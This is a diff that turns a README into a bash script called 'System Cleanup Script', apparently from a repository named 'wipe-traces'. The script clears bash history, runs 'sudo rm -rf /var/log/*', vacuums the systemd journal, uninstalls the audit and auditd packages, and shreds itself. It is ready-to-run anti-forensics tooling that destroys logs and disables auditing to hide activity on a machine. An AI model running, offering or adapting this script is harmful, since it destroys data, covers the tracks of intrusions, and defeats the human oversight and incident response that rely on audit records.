@@ -1,25 +1,29 @@
+#!/bin/bash
+
 # System Cleanup Script
+# This script clears logs, bash history, and removes audit logs.
+# It also deletes itself after execution.
 
-This script is designed to clean up system logs, bash history, and sensitive data. It also removes the `audit` package if installed, and wipes audit logs. The script is designed to be executed directly and will automatically delete itself once the process is completed.
+echo "Starting system cleanup..."
 
-## Features:
-- Clears bash history.
-- Removes log files from `/var/log/`.
-- Clears systemd journal logs.
-- Removes audit logs and the `audit` package.
-- Automatically deletes itself after execution.
+# Clear bash history
+history -c && history -w
+rm -f ~/.bash_history
 
-## Instructions
+# Remove log files
+sudo rm -rf /var/log/*
 
-### Prerequisites:
-- The script requires root privileges to clear system logs and perform cleanup.
-- It is assumed that the system has `auditd` (if present) installed.
+# Clear systemd journal logs
+sudo journalctl --rotate --vacuum-time=1s
 
-### How to Use:
+# Remove audit logs and audit package (if installed)
+if command -v yum &>/dev/null; then
+    sudo yum -y remove audit audit-libs
+elif command -v apt-get &>/dev/null; then
+    sudo apt-get -y remove auditd
+fi
 
-1. Download the script (e.g., `cleaner.sh`) from [GitHub](https://github.com/sumit-kumawat/wipe-traces/blob/main/cleaner.sh).
+# Securely delete this script after execution
+shred -u "$0"
 
-2. Make the script executable:
-
-   ```bash
-   chmod +x cleaner.sh
+echo "System cleanup completed successfully."
